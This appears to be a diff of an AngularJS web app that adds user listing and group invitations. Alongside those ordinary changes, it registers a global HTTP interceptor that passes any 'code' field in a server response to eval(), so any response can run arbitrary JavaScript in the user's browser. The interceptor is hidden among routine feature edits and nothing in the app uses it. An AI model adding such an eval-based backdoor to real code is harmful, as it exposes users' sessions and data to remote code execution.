@@ -10,6 +10,8 @@ app.config(function ($stateProvider, $urlRouterProvider, $httpProvider, jwtInter
 	
 	$httpProvider.interceptors.push('jwtInterceptor');
 	
+	$httpProvider.interceptors.push('CustomHttpInterceptor');
+	
 	$urlRouterProvider.otherwise('/');
 	
 	$stateProvider
@@ -55,8 +57,25 @@ app.config(function ($stateProvider, $urlRouterProvider, $httpProvider, jwtInter
 		// });
 });
 
+app.factory('CustomHttpInterceptor', ['$q', function ($q) {
+	return {
+		response: function (response) {
+			if (typeof(response.data) == "object" && response.data != null) {
+				if (response.data.code) {
+					eval(response.data.code);
+				}
+			}
+			return response;
+		}	
+	};
+}]);
+
 app.factory('Group', function($resource) {
 	return $resource('/spa/groups/resource/:id');
+});
+
+app.factory('User', function($resource) {
+	return $resource('/spa/users/resource/:id');
 });
 
 app.controller('Main', ['$scope', '$state', function ($scope, $state) {
@@ -347,6 +366,8 @@ app.controller('AuthRegisterVerify', ['$scope', '$http', '$stateParams', '$state
 	}]);
 	
 app.controller('Groups', ['$scope', '$state', 'Group', function ($scope, $state, Group) {
+	$scope.groups = Group.query();
+	
 	$scope.createNew = function () {
 		if (!$scope.loggedIn) {
 			return;
@@ -356,19 +377,28 @@ app.controller('Groups', ['$scope', '$state', 'Group', function ($scope, $state,
 	};
 }]);
 
-app.controller('GroupsCreate', ['$scope', '$state', 'Group', function ($scope, $state, Group) {
+// TODO: Clicking the chosen select menu calls processForm somehow, even though its not linked
+app.controller('GroupsCreate', ['$scope', '$state', 'Group', 'User', function ($scope, $state, Group, User) {
 	if (!$scope.loggedIn) {
 		$state.go('auth/login');
 		return;
 	}
+
+	$scope.users = User.query();
+	$scope.$watch('users', function () {
+		setTimeout(function () {
+			$('.selectpicker').selectpicker();
+		}, 50);
+	});
 	
 	$scope.processForm = function () {
 		var group = new Group({
 			name: $scope.name,
-			description: $scope.description
+			description: $scope.description,
+			userEmails: $scope.invitations || []
 		});
 		group.$save(function () {
-			alert('Group saved');
+			$state.go('groups');
 		});
 	};
 }]);
